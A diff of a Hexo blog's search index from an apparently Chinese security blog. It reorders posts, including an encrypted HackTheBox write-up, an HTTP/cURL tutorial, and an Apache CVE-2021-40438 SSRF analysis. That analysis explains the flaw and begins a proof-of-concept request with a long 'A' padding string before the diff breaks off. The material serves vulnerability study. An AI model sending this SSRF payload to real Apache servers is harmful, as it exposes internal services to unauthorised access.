@@ -349,33 +349,6 @@
     
     
     <entry>
-      <title>MonitorsThree</title>
-      <link href="/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"/>
-      <url>/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/</url>
-      
-        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="c0eb4cf71f1a2148d86a8016569088f65684e133334cae32b23bdf32cdc6ee7b">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259614437644d13c3b329af8fec292588f08255a9c57c03c7bbae47bfc8af8a04648593c61c347cfcf35c63b8a4e06256700a6882fc9a7a1d22e88723d69ff3adb295e1413ff7b0190229f531d1e91730f44f808e01f508f8c3e44e6bf6e71af5d8613bf9540b2396c0b51787c349bedbef2d28c848814c7f02183ce29ce4e8c00b7e54981558066e17a990b1442a970a53db3f88b126351504b1e21456cae198d37830c62866b2e509455cca5e9942ba48fb66ff9510c76aa50d4d659e1e86556efeb97e396a3cf34157995b652d5d49e881f5bdea12225b57bb917b57a30a2129d2da5f9b3455b1d3d2a03543de7ae62f82e56726513c7d7090cfd4024db9dbeb5c841399dc406d9d63d1c0d5d7f4d627b6e6b437d5200d55eb8a8e60a4a16137285d64d47149b5099111be904a1f6dccafdc6ee04f79f7dcbe2d38a06ac32aae914afde949ffa7983958de7842588df0a4b67f558c3a2a4df99105cad96f157f13a596be1fc64d10c392130d4624977869102b0d4f70cc0317c3f08a844bb9db3671a1c3200b9825c3a317b2d1f7043a59dce5ab58b0f3754ca387e759aceee4b474fcd1d8890a6ef42a2e28347a5c8405503cb47784fe1db3ea94eb7d49237daf4ef0b14662f21d15fb1fca2995ce469bda6e92f6ea63f26343a7d616da1bb9f8b4ba4959b717dbffcef7af823f5c77887d3012b03eef30a1d32970a8f6ef7670406eb1cf3fe655862f4825aa9dcb42cc10a18f57a3ad31b5d448bf714daff18add8004101dfee9c58d77c42d2cea3cabcda43d1c0761d6ddb7f573c3d5756eb1e442a34b3c43fac9208765e268d0417097db5bf300c580fcc9558ff2947935ae2f4185ff3b226d27b930d77a9d1bde1b1fc47978a811a802724f0298c029f444a46288e6f7d44fdc5385b5e74fd4e303b78ab309b293313755146e7ed4708bc3a26fcc5e2a313bac2a6978b5abc7c73</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      
-      
-      <categories>
-          
-          <category> 网络安全 </category>
-          
-      </categories>
-      
-      
-        <tags>
-            
-            <tag> Linux </tag>
-            
-            <tag> THB </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>Web中间件-Tomcat8</title>
       <link href="/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/"/>
       <url>/2024/11/13/2024-09-27-web%E4%B8%AD%E9%97%B4%E4%BB%B6-tomcat/</url>
@@ -395,6 +368,33 @@
             <tag> Web中间件 </tag>
             
             <tag> Tomcat </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>MonitorsThree</title>
+      <link href="/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/"/>
+      <url>/2024/11/13/2024-09-29-HTB-MonitorsThree-WriteUp/</url>
+      
+        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误😶‍🌫️" data-whm="文章部分缺失😯">  <script id="hbeData" type="hbeData" data-hmacdigest="c0eb4cf71f1a2148d86a8016569088f65684e133334cae32b23bdf32cdc6ee7b">7e8ec9cd4c38bd473ca2a20166522c3145fd1c8b18a1721263762d0215eb3f1a9e2f6583f81442cc48e4401935055f45e980a558d96e301c1d2cf7e701baaff41d92c08432e7b27405813252b7fa63f42d6601b18680ec8cb8c3cdde5eeac9cc1fab36494d3e026ad10b3dbf2435f3a644f0d10579b32e61ac09e2b0bbf3e8b9c3415bec1ef5e0d7b76ec542d8f30fa55b95ab194bbf2fad607064f7a5529ae6fd6e06a86504be6e6d2e7782191f259614437644d13c3b329af8fec292588f08255a9c57c03c7bbae47bfc8af8a04648593c61c347cfcf35c63b8a4e06256700a6882fc9a7a1d22e88723d69ff3adb295e1413ff7b0190229f531d1e91730f44f808e01f508f8c3e44e6bf6e71af5d8613bf9540b2396c0b51787c349bedbef2d28c848814c7f02183ce29ce4e8c00b7e54981558066e17a990b1442a970a53db3f88b126351504b1e21456cae198d37830c62866b2e509455cca5e9942ba48fb66ff9510c76aa50d4d659e1e86556efeb97e396a3cf34157995b652d5d49e881f5bdea12225b57bb917b57a30a2129d2da5f9b3455b1d3d2a03543de7ae62f82e56726513c7d7090cfd4024db9dbeb5c841399dc406d9d63d1c0d5d7f4d627b6e6b437d5200d55eb8a8e60a4a16137285d64d47149b5099111be904a1f6dccafdc6ee04f79f7dcbe2d38a06ac32aae914afde949ffa7983958de7842588df0a4b67f558c3a2a4df99105cad96f157f13a596be1fc64d10c392130d4624977869102b0d4f70cc0317c3f08a844bb9db3671a1c3200b9825c3a317b2d1f7043a59dce5ab58b0f3754ca387e759aceee4b474fcd1d8890a6ef42a2e28347a5c8405503cb47784fe1db3ea94eb7d49237daf4ef0b14662f21d15fb1fca2995ce469bda6e92f6ea63f26343a7d616da1bb9f8b4ba4959b717dbffcef7af823f5c77887d3012b03eef30a1d32970a8f6ef7670406eb1cf3fe655862f4825aa9dcb42cc10a18f57a3ad31b5d448bf714daff18add8004101dfee9c58d77c42d2cea3cabcda43d1c0761d6ddb7f573c3d5756eb1e442a34b3c43fac9208765e268d0417097db5bf300c580fcc9558ff2947935ae2f4185ff3b226d27b930d77a9d1bde1b1fc47978a811a802724f0298c029f444a46288e6f7d44fdc5385b5e74fd4e303b78ab309b293313755146e7ed4708bc3a26fcc5e2a313bac2a6978b5abc7c73</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">暂时还看不了哦🔑</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Linux </tag>
+            
+            <tag> THB </tag>
             
         </tags>
       
@@ -491,6 +491,19 @@
     
     
     <entry>
+      <title></title>
+      <link href="/2024/11/13/2024-09-16-HTTP%E5%9F%BA%E7%A1%80/"/>
+      <url>/2024/11/13/2024-09-16-HTTP%E5%9F%BA%E7%A1%80/</url>
+      
+        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="超文本传输协议-（HTTP）"><a href="#超文本传输协议-（HTTP）" class="headerlink" title="超文本传输协议 （HTTP）"></a><strong>超文本传输协议 （HTTP）</strong></h1><p>今天，我们使用的大多数应用程序（包括 Web 和移动应用程序）都不断与 Internet 交互。大多数 Internet 通信都是通过 HTTP 协议通过 Web 请求进行的。<a href="https://tools.ietf.org/html/rfc2616">HTTP</a> 是用于访问万维网资源的应用程序级协议。该术语代表包含指向其他资源的链接的文本和读者可以轻松解释的文本。<code>hypertext</code></p><p>HTTP 通信由客户端和服务器组成，其中客户端向服务器请求资源。服务器处理请求并返回请求的资源。HTTP 通信的默认端口是 port ，但可以根据 Web 服务器配置将其更改为任何其他端口。当我们使用互联网访问不同的网站时，会使用相同的请求。我们输入 （） 作为 （） 以访问所需的网站，例如 <a href="http://www.hackthebox.com/">www.hackthebox.com</a>。<code>80Fully Qualified Domain NameFQDNUniform Resource LocatorURL</code></p><hr><h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a><strong>网址</strong></h1><p>通过 HTTP 上的资源是通过 访问的，它提供了更多的规范，而不仅仅是指定我们想要访问的网站。让我们看看 URL 的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL</span><br></pre></td></tr></table></figure><p>!<a href="https://academy.hackthebox.com/storage/modules/35/url_structure.png">https://academy.hackthebox.com/storage/modules/35/url_structure.png</a></p><p>以下是每个组件的含义：</p><table><thead><tr><th><strong>元件</strong></th><th><strong>例</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Scheme</code></td><td><code>http://</code> <code>https://</code></td><td>这用于标识客户端正在访问的协议，并以冒号和双斜杠 （<code>://</code>)</td></tr><tr><td><code>User Info</code></td><td><code>admin:password@</code></td><td>这是一个可选组件，其中包含用于向主机进行身份验证的凭据（用冒号分隔），并通过 at 符号 （<code>:@</code>)</td></tr><tr><td><code>Host</code></td><td><code>inlanefreight.com</code></td><td>host 表示资源位置。这可以是主机名或 IP 地址</td></tr><tr><td><code>Port</code></td><td><code>:80</code></td><td>the 与 the 之间用冒号 （） 分隔。如果未指定 port，则 schemes 默认为 port，默认为 port<code>PortHost:http80https443</code></td></tr><tr><td><code>Path</code></td><td><code>/dashboard.php</code></td><td>这指向正在访问的资源，可以是文件或文件夹。如果未指定 path，则服务器返回默认索引（例如 ）。<code>index.html</code></td></tr><tr><td><code>Query String</code></td><td><code>?login=true</code></td><td>查询字符串以问号 （） 开头，由参数（例如 ）和值（例如 ）组成。多个参数可以用 &amp; 符号 （） 分隔。<code>?logintrue&amp;</code></td></tr><tr><td><code>Fragments</code></td><td><code>#status</code></td><td>客户端上的浏览器会处理片段，以查找主资源中的部分（例如，页面上的标题或部分）。</td></tr></tbody></table><p>并非所有组件都需要访问资源。主要的必填字段是 scheme 和 host，没有它们，请求将没有可请求的资源。</p><hr><h1 id="HTTP-流"><a href="#HTTP-流" class="headerlink" title="HTTP 流"></a><strong>HTTP 流</strong></h1><p>!<a href="https://academy.hackthebox.com/storage/modules/35/HTTP_Flow.png">https://academy.hackthebox.com/storage/modules/35/HTTP_Flow.png</a></p><p>上图在非常高的级别上展示了 HTTP 请求的剖析。用户第一次在浏览器中输入 URL （） 时，它会向 DNS（域名解析）服务器发送请求以解析域并获取其 IP。DNS 服务器查找 IP 地址并返回该地址。所有域名都需要以这种方式解析，因为服务器在没有 IP 地址的情况下无法通信。<code>inlanefreight.cominlanefreight.com</code></p><p><strong>注意：</strong>我们的浏览器通常首先在本地 ‘’ 文件中查找记录，如果其中不存在请求的域，那么它们会联系其他 DNS 服务器。我们可以使用 ‘’ 手动添加记录以进行 DNS 解析，方法是添加 IP 后跟域名。<code>/etc/hosts/etc/hosts</code></p><p>一旦浏览器获得链接到所请求域的 IP 地址，它就会向默认 HTTP 端口（例如 ）发送 GET 请求，询问根路径。然后，Web 服务器接收请求并对其进行处理。默认情况下，服务器配置为在收到请求时返回索引文件。<code>80//</code></p><p>在这种情况下，Web 服务器将读取 的内容并将其作为 HTTP 响应返回。响应还包含状态代码（例如 ），表示请求已成功处理。然后，Web 浏览器呈现内容并将其呈现给用户。<code>index.html200 OKindex.html</code></p><p><strong>注意：</strong>本模块主要关注 HTTP Web 请求。有关 HTML 和 Web 应用程序的更多信息，您可以参考 <a href="https://academy.hackthebox.com/module/details/75">Web 应用程序简介</a>模块。</p><hr><h1 id="卷曲"><a href="#卷曲" class="headerlink" title="卷曲"></a><strong>卷曲</strong></h1><p>在本模块中，我们将通过任何 Web 渗透测试人员的两个最重要的工具发送 Web 请求，即 Web 浏览器（如 Chrome 或 Firefox）和命令行工具。<code>cURL</code></p><p><a href="https://curl.haxx.se/">cURL</a>（客户端 URL）是一个命令行工具和库，主要支持 HTTP 以及许多其他协议。这使它成为脚本和自动化的良好候选者，因此对于从命令行发送各种类型的 Web 请求至关重要，这对于许多类型的 Web 渗透测试都是必需的。</p><p>我们可以将基本 HTTP 请求用作 cURL 的参数，将其发送到任何 URL，如下所示：</p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl inlanefreight.com&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到，与 Web 浏览器不同，cURL 不会呈现 HTML&#x2F;JavaScript&#x2F;CSS 代码，而是以原始格式打印它。但是，作为渗透测试人员，我们主要对请求和响应上下文感兴趣，它通常比 Web 浏览器更快、更方便。</p><p>我们还可以使用 cURL 下载页面或文件，并使用标志将内容输出到文件中。如果我们想指定输出文件名，我们可以使用 flag 并指定名称。否则，我们可以使用 cURL 将使用远程文件名，如下所示：<code>-O-o-O</code></p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl -O inlanefreight.com/index.htmlDeviLeo@htb[/htb]$ lsindex.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我们所看到的，这次输出没有打印出来，而是保存到 中。我们注意到 cURL 在处理请求时仍然打印了一些状态。我们可以使用 flag 将状态静音，如下所示：<code>index.html-s</code></p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl -s -O inlanefreight.com/index.html</span><br></pre></td></tr></table></figure><p>这一次，cURL 没有打印任何内容，因为输出已保存到文件中。最后，我们可以使用该标志来查看我们可以对 cURL 使用哪些其他选项：<code>index.html-h</code></p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl -hUsage: curl [options...] &lt;url&gt;</span><br><span class="line"> -d, --data &lt;data&gt;   HTTP POST data</span><br><span class="line"> -h, --help &lt;category&gt; Get help for commands</span><br><span class="line"> -i, --include       Include protocol response headers in the output</span><br><span class="line"> -o, --output &lt;file&gt; Write to file instead of stdout</span><br><span class="line"> -O, --remote-name   Write output to a file named as the remote file</span><br><span class="line"> -s, --silent        Silent mode</span><br><span class="line"> -u, --user &lt;user:password&gt; Server user and password</span><br><span class="line"> -A, --user-agent &lt;name&gt; Send User-Agent &lt;name&gt; to server</span><br><span class="line"> -v, --verbose       Make the operation more talkative</span><br><span class="line"></span><br><span class="line">This is not the full help, this menu is stripped into categories.</span><br><span class="line">Use &quot;--help category&quot; to get an overview of all categories.</span><br><span class="line">Use the user manual `man curl` or the &quot;--help all&quot; flag for all options.</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
+      
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>MonitorsThree</title>
       <link href="/2024/11/13/2024-09-16-MonitorsThree-htb/"/>
       <url>/2024/11/13/2024-09-16-MonitorsThree-htb/</url>
@@ -514,19 +527,6 @@
             <tag> 靶场 </tag>
             
         </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/2024/11/13/2024-09-16-HTTP%E5%9F%BA%E7%A1%80/"/>
-      <url>/2024/11/13/2024-09-16-HTTP%E5%9F%BA%E7%A1%80/</url>
-      
-        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h1 id="超文本传输协议-（HTTP）"><a href="#超文本传输协议-（HTTP）" class="headerlink" title="超文本传输协议 （HTTP）"></a><strong>超文本传输协议 （HTTP）</strong></h1><p>今天，我们使用的大多数应用程序（包括 Web 和移动应用程序）都不断与 Internet 交互。大多数 Internet 通信都是通过 HTTP 协议通过 Web 请求进行的。<a href="https://tools.ietf.org/html/rfc2616">HTTP</a> 是用于访问万维网资源的应用程序级协议。该术语代表包含指向其他资源的链接的文本和读者可以轻松解释的文本。<code>hypertext</code></p><p>HTTP 通信由客户端和服务器组成，其中客户端向服务器请求资源。服务器处理请求并返回请求的资源。HTTP 通信的默认端口是 port ，但可以根据 Web 服务器配置将其更改为任何其他端口。当我们使用互联网访问不同的网站时，会使用相同的请求。我们输入 （） 作为 （） 以访问所需的网站，例如 <a href="http://www.hackthebox.com/">www.hackthebox.com</a>。<code>80Fully Qualified Domain NameFQDNUniform Resource LocatorURL</code></p><hr><h1 id="网址"><a href="#网址" class="headerlink" title="网址"></a><strong>网址</strong></h1><p>通过 HTTP 上的资源是通过 访问的，它提供了更多的规范，而不仅仅是指定我们想要访问的网站。让我们看看 URL 的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">URL</span><br></pre></td></tr></table></figure><p>!<a href="https://academy.hackthebox.com/storage/modules/35/url_structure.png">https://academy.hackthebox.com/storage/modules/35/url_structure.png</a></p><p>以下是每个组件的含义：</p><table><thead><tr><th><strong>元件</strong></th><th><strong>例</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>Scheme</code></td><td><code>http://</code> <code>https://</code></td><td>这用于标识客户端正在访问的协议，并以冒号和双斜杠 （<code>://</code>)</td></tr><tr><td><code>User Info</code></td><td><code>admin:password@</code></td><td>这是一个可选组件，其中包含用于向主机进行身份验证的凭据（用冒号分隔），并通过 at 符号 （<code>:@</code>)</td></tr><tr><td><code>Host</code></td><td><code>inlanefreight.com</code></td><td>host 表示资源位置。这可以是主机名或 IP 地址</td></tr><tr><td><code>Port</code></td><td><code>:80</code></td><td>the 与 the 之间用冒号 （） 分隔。如果未指定 port，则 schemes 默认为 port，默认为 port<code>PortHost:http80https443</code></td></tr><tr><td><code>Path</code></td><td><code>/dashboard.php</code></td><td>这指向正在访问的资源，可以是文件或文件夹。如果未指定 path，则服务器返回默认索引（例如 ）。<code>index.html</code></td></tr><tr><td><code>Query String</code></td><td><code>?login=true</code></td><td>查询字符串以问号 （） 开头，由参数（例如 ）和值（例如 ）组成。多个参数可以用 &amp; 符号 （） 分隔。<code>?logintrue&amp;</code></td></tr><tr><td><code>Fragments</code></td><td><code>#status</code></td><td>客户端上的浏览器会处理片段，以查找主资源中的部分（例如，页面上的标题或部分）。</td></tr></tbody></table><p>并非所有组件都需要访问资源。主要的必填字段是 scheme 和 host，没有它们，请求将没有可请求的资源。</p><hr><h1 id="HTTP-流"><a href="#HTTP-流" class="headerlink" title="HTTP 流"></a><strong>HTTP 流</strong></h1><p>!<a href="https://academy.hackthebox.com/storage/modules/35/HTTP_Flow.png">https://academy.hackthebox.com/storage/modules/35/HTTP_Flow.png</a></p><p>上图在非常高的级别上展示了 HTTP 请求的剖析。用户第一次在浏览器中输入 URL （） 时，它会向 DNS（域名解析）服务器发送请求以解析域并获取其 IP。DNS 服务器查找 IP 地址并返回该地址。所有域名都需要以这种方式解析，因为服务器在没有 IP 地址的情况下无法通信。<code>inlanefreight.cominlanefreight.com</code></p><p><strong>注意：</strong>我们的浏览器通常首先在本地 ‘’ 文件中查找记录，如果其中不存在请求的域，那么它们会联系其他 DNS 服务器。我们可以使用 ‘’ 手动添加记录以进行 DNS 解析，方法是添加 IP 后跟域名。<code>/etc/hosts/etc/hosts</code></p><p>一旦浏览器获得链接到所请求域的 IP 地址，它就会向默认 HTTP 端口（例如 ）发送 GET 请求，询问根路径。然后，Web 服务器接收请求并对其进行处理。默认情况下，服务器配置为在收到请求时返回索引文件。<code>80//</code></p><p>在这种情况下，Web 服务器将读取 的内容并将其作为 HTTP 响应返回。响应还包含状态代码（例如 ），表示请求已成功处理。然后，Web 浏览器呈现内容并将其呈现给用户。<code>index.html200 OKindex.html</code></p><p><strong>注意：</strong>本模块主要关注 HTTP Web 请求。有关 HTML 和 Web 应用程序的更多信息，您可以参考 <a href="https://academy.hackthebox.com/module/details/75">Web 应用程序简介</a>模块。</p><hr><h1 id="卷曲"><a href="#卷曲" class="headerlink" title="卷曲"></a><strong>卷曲</strong></h1><p>在本模块中，我们将通过任何 Web 渗透测试人员的两个最重要的工具发送 Web 请求，即 Web 浏览器（如 Chrome 或 Firefox）和命令行工具。<code>cURL</code></p><p><a href="https://curl.haxx.se/">cURL</a>（客户端 URL）是一个命令行工具和库，主要支持 HTTP 以及许多其他协议。这使它成为脚本和自动化的良好候选者，因此对于从命令行发送各种类型的 Web 请求至关重要，这对于许多类型的 Web 渗透测试都是必需的。</p><p>我们可以将基本 HTTP 请求用作 cURL 的参数，将其发送到任何 URL，如下所示：</p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl inlanefreight.com&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">...SNIP...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们看到，与 Web 浏览器不同，cURL 不会呈现 HTML&#x2F;JavaScript&#x2F;CSS 代码，而是以原始格式打印它。但是，作为渗透测试人员，我们主要对请求和响应上下文感兴趣，它通常比 Web 浏览器更快、更方便。</p><p>我们还可以使用 cURL 下载页面或文件，并使用标志将内容输出到文件中。如果我们想指定输出文件名，我们可以使用 flag 并指定名称。否则，我们可以使用 cURL 将使用远程文件名，如下所示：<code>-O-o-O</code></p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl -O inlanefreight.com/index.htmlDeviLeo@htb[/htb]$ lsindex.html</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>正如我们所看到的，这次输出没有打印出来，而是保存到 中。我们注意到 cURL 在处理请求时仍然打印了一些状态。我们可以使用 flag 将状态静音，如下所示：<code>index.html-s</code></p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl -s -O inlanefreight.com/index.html</span><br></pre></td></tr></table></figure><p>这一次，cURL 没有打印任何内容，因为输出已保存到文件中。最后，我们可以使用该标志来查看我们可以对 cURL 使用哪些其他选项：<code>index.html-h</code></p><p>超文本传输协议 （HTTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DeviLeo@htb[/htb]$ curl -hUsage: curl [options...] &lt;url&gt;</span><br><span class="line"> -d, --data &lt;data&gt;   HTTP POST data</span><br><span class="line"> -h, --help &lt;category&gt; Get help for commands</span><br><span class="line"> -i, --include       Include protocol response headers in the output</span><br><span class="line"> -o, --output &lt;file&gt; Write to file instead of stdout</span><br><span class="line"> -O, --remote-name   Write output to a file named as the remote file</span><br><span class="line"> -s, --silent        Silent mode</span><br><span class="line"> -u, --user &lt;user:password&gt; Server user and password</span><br><span class="line"> -A, --user-agent &lt;name&gt; Send User-Agent &lt;name&gt; to server</span><br><span class="line"> -v, --verbose       Make the operation more talkative</span><br><span class="line"></span><br><span class="line">This is not the full help, this menu is stripped into categories.</span><br><span class="line">Use &quot;--help category&quot; to get an overview of all categories.</span><br><span class="line">Use the user manual `man curl` or the &quot;--help all&quot; flag for all options.</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
-      
-      
       
     </entry>
     
@@ -806,8 +806,8 @@
     
     <entry>
       <title>APACHE_CVE-2021-40438-SSRF漏洞分析复现</title>
-      <link href="/2024/11/13/2024-09-02-APACHE_CVE-2021-40438-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
-      <url>/2024/11/13/2024-09-02-APACHE_CVE-2021-40438-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
+      <link href="/2024/11/13/APACHE_CVE-2021-40438-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/"/>
+      <url>/2024/11/13/APACHE_CVE-2021-40438-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/</url>
       
         <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.4.0/dist/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>使用字符串文法来表示多种含义的方式通常暗藏一些漏洞，比如这里，进入这个if语句需要满足三个条件：</p><p>r-&gt;filename的前6个字符等于proxy:<br>r-&gt;filename的字符串中含有关键字unix:<br>unix:关键字后的部分含有字符|<br>当满足这三个条件后，将unix:后面的内容进行解析，设置成uds_path的值；将字符|后面的内容，设置成rurl的值。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>这个函数中，当待join的两段路径长度+4大于APR_PATH_MAX，也就是4096的时候，则函数会返回一个路径过长的状态码，导致最后unix套接字的值是null</p><p>也就是说，我们只需要在unix:与|之间传入内容长度大概超过4092的字符串，就能构造出uds_path为null的结果，让Apache不再发送请求给unix套接字。</p><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">GET /?unix:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA